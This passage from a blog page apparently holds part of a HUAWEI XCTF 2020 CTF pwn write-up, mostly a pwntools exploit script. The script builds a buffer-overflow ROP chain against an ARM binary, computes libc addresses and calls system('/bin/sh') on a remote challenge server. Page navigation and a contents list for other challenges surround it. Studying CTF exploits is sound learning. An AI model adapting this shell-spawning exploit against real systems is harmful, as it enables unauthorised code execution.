class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;./bin&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;139.159.210.220&quot;</span><br>server_port = <span class="hljs-number">9999</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	main = <span class="hljs-number">0x000104A0</span><br>	<span class="hljs-comment">#gadget_2 = 0x000104F8 #  MOV R0, R3;SUB SP, R11, #4; POP &#123;R11,PC&#125;</span><br>	gadget_1 = <span class="hljs-number">0x00010348</span> <span class="hljs-comment"># pop &#123;r3, pc&#125;</span><br>	gadget_2 = <span class="hljs-number">0x000104D8</span> <span class="hljs-comment"># printf</span><br>	gadget_3 = <span class="hljs-number">0x00010500</span> <span class="hljs-comment"># pop &#123;R11,PC&#125;</span><br>	gadget_4 = <span class="hljs-number">0x000104F8</span><br>	libc_base = <span class="hljs-number">0xff6db39c</span> - libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>	system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	bin_sh = libc_base + <span class="hljs-number">0xfe861</span><br>	gadget = libc_base + <span class="hljs-number">0x0006beec</span> <span class="hljs-comment"># pop &#123;r0, r4, pc&#125;</span><br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	bss = <span class="hljs-number">0x00020F08</span><br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	# leak</span><br><span class="hljs-string">	p = b&#x27;A&#x27; * 0x104</span><br><span class="hljs-string">	p += p32(gadget_1)</span><br><span class="hljs-string">	p += p32(elf.got[&#x27;printf&#x27;])</span><br><span class="hljs-string">	p += p32(gadget_3)</span><br><span class="hljs-string">	p += p32(1) # r11</span><br><span class="hljs-string">	#p += p32(elf.plt[&#x27;printf&#x27;])</span><br><span class="hljs-string">	p += p32(gadget_2)</span><br><span class="hljs-string">	#li(&#x27;ru&#x27;)</span><br><span class="hljs-string">	sla(&#x27;input:&#x27;, p)</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x100</span><br>	p += p32(bss + <span class="hljs-number">0x100</span>) <span class="hljs-comment"># r11</span><br>	p += p32(gadget)<br>	p += p32(bin_sh)<br>	p += p32(bin_sh)<br>	p += p32(system)<br>	sla(<span class="hljs-string">&#x27;input:&#x27;</span>, p)<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>

<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2021/01/15/tools/pwn/mips/mips_env/">← Next MIPS Qemu环境搭建</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2020/12/06/security/ctf/pwn/axb2020/">Some small records of the I-SOON Cup Of CUIT CTF Competition final Prev →</a></div></div></div><details id="reward"><summary>打赏</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/Yue-plus">John Doe</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HUAWEI-XCTF-2020-PWN-WRITE-UP"><span class="toc-number">1.</span> <span class="toc-text">HUAWEI XCTF 2020 PWN WRITE UP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HUAWEI-XCTF-2020-First"><span class="toc-number">2.</span> <span class="toc-text">HUAWEI XCTF 2020 First</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CPP"><span class="toc-number">2.1.</span> <span class="toc-text">CPP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">2.1.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.1.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HUAWEI-XCTF-2020-Second"><span class="toc-number">3.</span> <span class="toc-text">HUAWEI XCTF 2020 Second</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#honorbook"><span class="toc-number">3.1.</span> <span class="toc-text">honorbook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HUAWEI-XCTF-2020-Third"><span class="toc-number">4.</span> <span class="toc-text">HUAWEI XCTF 2020 Third</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell"><span class="toc-number">4.1.</span> <span class="toc-text">shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vul"><span class="toc-number">4.1.2.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb-script"><span class="toc-number">4.1.3.</span> <span class="toc-text">gdb script</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">4.1.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell2"><span class="toc-number">4.2.</span> <span class="toc-text">shell2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec-2"><span class="toc-number">4.2.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vul-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb-script-1"><span class="toc-number">4.2.3.</span> <span class="toc-text">gdb script</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">4.2.4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnit"><span class="toc-number">4.2.5.</span> <span class="toc-text">pwnit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec-3"><span class="toc-number">4.2.6.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vul-2"><span class="toc-number">4.2.7.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-number">4.2.8.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">赣ICP备19008355号</a></nobr><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><br><nobr>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'LSe7mf1XYliLqgIrc3jlqXfT-gzGzoHsz'
 , appKey: 'Fu9giJfnidkCamaW89FUpidw' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>